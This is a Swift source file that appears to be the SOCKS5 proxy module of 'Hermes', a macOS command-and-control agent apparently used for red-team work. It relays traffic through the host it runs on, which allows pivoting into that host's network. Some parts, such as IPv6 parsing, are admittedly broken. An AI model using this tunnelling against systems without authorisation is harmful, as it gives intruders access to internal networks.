//
//  socks.swift
//  Hermes
//
//  Created by Offensive Security on 3/7/24.
//

import Foundation

let ConnectCommand: UInt8 = 1
let ipv4Address: UInt8 = 1
let fqdnAddress: UInt8 = 3
let ipv6Address: UInt8 = 4
let NoAuth: UInt8 = 0
let socks5Version: UInt8 = 5


let SuccessReply: uint8 = 0
let ServerFailure: uint8 = 1
let RuleFailure: uint8 = 2
let NetworkUnreachable: uint8 = 3
let HostUnreachable: uint8 = 4
let ConnectionRefused: uint8 = 5
let TtlExpired: uint8 = 6
let CommandNotSupported: uint8 = 7
let AddrTypeNotSupported: uint8 = 8


class SocksTracker {
    var socksMsgList = ItemQueue<SocksMsg>()
    var connection: Socket?
}

var connectionMap = [Int: SocksTracker]()
var connectionMap_semaphore = DispatchSemaphore(value: 1)

class AddrSpec {
    var fqdn: String
    var ip: String
    var port: Int
    init() {
        fqdn = ""
        ip = ""
        port = 0
    }
}
class ItemQueue<T> {
    private var items: [T] = []
    private let semaphore = DispatchSemaphore(value: 0)
    private let queue = DispatchQueue(label: "itemQueue")

    // Adds an item to the queue and signals any waiting thread that an item is available.
    func addItem(_ item: T) {
        queue.async {
            self.items.append(item)
            self.semaphore.signal()
        }
    }

    // Blocks the calling thread if no items are available, then removes and returns an item when it becomes available.
    func removeItem() -> T {
        semaphore.wait() // Wait for an item to be added
        return queue.sync {
            self.items.removeFirst()
        }
    }
    func isEmpty() -> Bool {
        if items.isEmpty {
            return true
        }
        return false
    }
}



class SocksMsg {
    var exit: Bool
    var server_id: Int
    var port: Int
    var data: String
    init() {
        self.exit = false
        self.server_id = 0
        self.data = ""
        self.port = 0
    }
}

class SocksMsgList {
    var SocksMsgCount = 0
    var SocksMsgList = ItemQueue<SocksMsg>()
    var thread: Thread?
}
var socksResponsesList = [SocksMsg]()

func socks(job: Job) {
    do {
        let jsonParameters = try JSON(data: toData(string: job.parameters))
        
        job.completed = true
        let action = jsonParameters["action"].stringValue
        if action == "start" {
            job.result = "Socks started"
            print("Socks started")
            /*
            let queue = DispatchQueue(label: "", qos: .utility, attributes: .concurrent)
            queue.async {
                socksMsgList.thread = Thread.current
                handleMutexMapModifications()
            }
             */
        }
        else if action == "stop" {
            job.result = "Socks stopped"
            socksMsgList.thread?.cancel()
        }
        else if action == "flush" {
            job.result = "Socks data flushed"
        }
    }
    catch {
        job.result = "Exception caught: \(error)"
        job.completed = true
        job.success = false
        job.status = "error"
    }
}

func handleMutexMapModifications() {
    while true {
        //print("let's start looping thru socks")
        let socksMsg = socksMsgList.SocksMsgList.removeItem()
        if connectionMap[socksMsg.server_id] != nil {
            //print("connection already established, let's send this one out")
            connectionMap[socksMsg.server_id]?.socksMsgList.addItem(socksMsg)
        }
        else {
            //New connection
            if !socksMsg.exit {
                var data = fromBase64(data: socksMsg.data)
                
                //let header3 = data[2]
                
                let header = data.readBytes(count: 3)!
                
                //print(data)
                //print(header[0])
                //print(header[1])
                if header[0] != 5 {
                    
                    print("Address Type Not Supported")
                    let bytesToSend = sendReply(resp: AddrTypeNotSupported, addr: nil)
                    let msg = SocksMsg.init()
                    msg.server_id = socksMsg.server_id
                    msg.data = toBase64(data: bytesToSend)
                    msg.exit = true
                    socksResponsesList.append(msg)
                    continue
                    //TODO: error handle
                }
                //print(data)
                let dest = ReadAddrSpec(data: &data)
                
                if dest.fqdn != "" {
                    dest.ip = resolveFQDN(fqdn: dest.fqdn)
                }
                if dest.ip == "" {
                    print("Host Unreachable")
                    let bytesToSend = sendReply(resp: HostUnreachable, addr: nil)
                    let msg = SocksMsg.init()
                    msg.server_id = socksMsg.server_id
                    msg.data = toBase64(data: bytesToSend)
                    msg.exit = true
                    socksResponsesList.append(msg)
                    continue
                }
                //print(dest.ip)
                
                if header[1] == ConnectCommand {

                    do {
                        let connection = try Socket.create()
                        if dest.fqdn == "" {
                            try connection.connect(to: dest.ip, port: Int32(dest.port))
                        }
                        else {
                            try connection.connect(to: dest.fqdn, port: Int32(dest.port))
                        }
                        //print(connection.isBlocking)
                        try connection.setBlocking(mode: true)
                        
                        var addr_in = sockaddr_in();
                        addr_in.sin_len = UInt8(MemoryLayout.size(ofValue: addr_in));
                        addr_in.sin_family = sa_family_t(AF_INET);

                        var len = socklen_t(addr_in.sin_len);
                        let result = withUnsafeMutablePointer(to: &addr_in, {
                          $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                              return Darwin.getsockname(connection.socketfd, $0, &len);
                          }
                        });
                        let bind = AddrSpec.init()
                        let local_addr = String.init(cString: Darwin.inet_ntoa(addr_in.sin_addr))
                        let local_port = CFSwapInt16(addr_in.sin_port)
                        //print(local_addr)
                        //print(local_port)
                        bind.ip = local_addr
                        bind.port = Int(local_port)
                        let bytesToSend = sendReply(resp: SuccessReply, addr: dest)
                        let socksResponse = SocksMsg.init()
                        socksResponse.server_id = socksMsg.server_id
                        socksResponse.data = toBase64(data: bytesToSend)
                        socksResponse.exit = false
                        //print(socksResponse.data)
                        let socksTracker = SocksTracker.init()
                        socksTracker.connection = connection
                        
                        connectionMap[socksMsg.server_id] = socksTracker
                        
                        socksResponsesList.append(socksResponse)
                        let writer_queue = DispatchQueue(label: "", qos: .utility, attributes: .concurrent)
                        writer_queue.async {
                            writeToProxy(recvChan: socksTracker.socksMsgList, connection: connection, server_id: socksMsg.server_id)
                        }
                        let reader_queue = DispatchQueue(label: "", qos: .utility, attributes: .concurrent)
                        reader_queue.async {
                            readFromProxy(connection: connection, server_id: socksMsg.server_id)
                        }
                    }
                    catch {
                        print("Can't set up connection: \(error)")
                        print("Host Unreachable")
                        var resp = HostUnreachable
                        if error.localizedDescription.contains("refused") {
                            resp = ConnectionRefused
                        }
                        else if error.localizedDescription.contains("network is unreachable"){
                            resp = NetworkUnreachable
                        }
                        let bytesToSend = sendReply(resp: resp, addr: nil)
                        let msg = SocksMsg.init()
                        msg.server_id = socksMsg.server_id
                        msg.data = toBase64(data: bytesToSend)
                        msg.exit = true
                        socksResponsesList.append(msg)
                        continue
                    }
                }
            }
        }
    }
}
func writeToProxy(recvChan: ItemQueue<SocksMsg>, connection: Socket, server_id: Int) {
    while true {
        let socksMsg = recvChan.removeItem()
        //print("got a new thing ot send to proxy")
        if socksMsg.exit {
            let msg = SocksMsg.init()
            msg.server_id = server_id
            msg.data = ""
            msg.exit = true
            socksResponsesList.append(msg)
            connection.close()
            connectionMap_semaphore.wait()
            if connectionMap[server_id] != nil {
                connectionMap[server_id] = nil
            }
            connectionMap_semaphore.signal()
            return
        }
        do{
            let data = fromBase64(data: socksMsg.data)
            //print(data)
            try connection.write(from: data)
            //print("sent the data")
        }
        catch {
            print("writeToProxy: \(error)")
            let msg = SocksMsg.init()
            msg.server_id = server_id
            msg.data = ""
            msg.exit = true
            socksResponsesList.append(msg)
            connection.close()
            connectionMap_semaphore.wait()
            if connectionMap[server_id] != nil {
                connectionMap[server_id] = nil
            }
            connectionMap_semaphore.signal()
            
            
            
            return
        }
        
    }
    
}

func readFromProxy(connection: Socket, server_id: Int) {
    var finished = false
    while !finished {
        //print("This should only be printing once")
        do {
            var data = Data()
            let bytesRead = try connection.read(into: &data)
            if bytesRead > 0 {
                let socksResp = SocksMsg.init()
                socksResp.server_id = server_id
                socksResp.data = toBase64(data: data)
                socksResp.exit = false
                socksResponsesList.append(socksResp)
            }
        }
        catch {
            print("readFromProxy: \(error)")
            finished = true
            let msg = SocksMsg.init()
            msg.server_id = server_id
            msg.data = ""
            msg.exit = true
            socksResponsesList.append(msg)
            connection.close()
            connectionMap_semaphore.wait()
            if connectionMap[server_id] != nil {
                connectionMap[server_id]?.socksMsgList.addItem(msg)
                connectionMap[server_id] = nil
            }
            connectionMap_semaphore.signal()
        }
    }
}

func ReadAddrSpec(data: inout Data) -> AddrSpec {
    let d = AddrSpec.init()
    let addrType = data.readByte()!
    //ipv4Address
    if addrType == 1 {
        var ipData = Data(repeating: 0, count: 4)
        ipData.append(data.readBytes(count: 4)!)
        let value = Int(bigEndian: ipData.withUnsafeBytes { $0.pointee })
        //print(value)
        d.ip = IntToIP(int: value)
 
    }
    //ipv6Address
    else if addrType == 4 {
        //This is definitely not right lmao TODO: fix
        var ipData = Data()
        ipData.append(data.readBytes(count: 16)!)
        let value = Int(bigEndian: ipData.withUnsafeBytes { $0.pointee })
        //print(value)
        d.ip = IntToIP(int: value)
 
    }
    //fqdnAddress
    else if addrType == 3 {
        let addr_len = data.readByte()!
        let fqdn = String(decoding: data.readBytes(count: Int(addr_len))!, as: UTF8.self)
        //print(fqdn)
        d.fqdn = fqdn
        
    }
    var portData = Data(repeating: 0, count: 6)
    portData.append(data.readBytes(count: 2)!)
    let port_value = Int(bigEndian: portData.withUnsafeBytes { $0.pointee })
    //print(port_value)
    d.port = port_value
    
    return d
}

func resolveFQDN(fqdn: String) -> String {
    let host = CFHostCreateWithName(nil, fqdn as CFString).takeRetainedValue()
    CFHostStartInfoResolution(host, .addresses, nil)
    var success: DarwinBoolean = false
    if let addresses = CFHostGetAddressing(host, &success)?.takeUnretainedValue() as NSArray? {
        for case let theAddress as NSData in addresses {
            var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
            if getnameinfo(theAddress.bytes.assumingMemoryBound(to: sockaddr.self), socklen_t(theAddress.length),
                           &hostname, socklen_t(hostname.count), nil, 0, NI_NUMERICHOST) == 0 {
                let numAddress = String(cString: hostname)
                return numAddress
            }
        }
    }
    return ""
}

func sendReply(resp: UInt8, addr: AddrSpec?) -> Data {
    var addrType: UInt8 = 0
    var addrBody =  Data()
    var addrPort: UInt16 = 0
    guard let addr = addr else {
        addrType = 1
        addrBody = Data(repeating: 0, count: 4)
        addrPort = 0
        var msg = Data(repeating: 0, count: 6+addrBody.count)
        msg[0] = 5
        msg[1] = resp
        msg[2] = 0 // Reserved
        msg[3] = addrType
        msg[4..<addrBody.count+4] = addrBody
        msg[4+addrBody.count] = UInt8(addrPort >> 8)
        msg[4+addrBody.count+1] = UInt8(addrPort & 0xff)
        return msg
    }
    if addr.fqdn != "" {
        addrType = fqdnAddress
        addrBody = Data(repeating: UInt8(addr.fqdn.count), count: 1)
        addrBody.append(addr.fqdn.data(using: .utf8)!)
        addrPort = UInt16(addr.port)
    }
    else {
        //IPV4
        var ip_int = UInt32(IPToInt(ip: addr.ip))
        addrType = ipv4Address
        addrBody = Data(bytes: &ip_int, count: MemoryLayout.size(ofValue: ip_int))
        addrPort = UInt16(addr.port)
    }
    //TODO: Add ipv6 support
    var msg = Data(repeating: 0, count: 6+addrBody.count)
    msg[0] = 5
    msg[1] = resp
    msg[2] = 0 // Reserved
    msg[3] = addrType
    msg[4..<addrBody.count+4] = addrBody
    msg[4+addrBody.count] = UInt8(addrPort >> 8)
    msg[4+addrBody.count+1] = UInt8(addrPort & 0xff)
    return msg
}
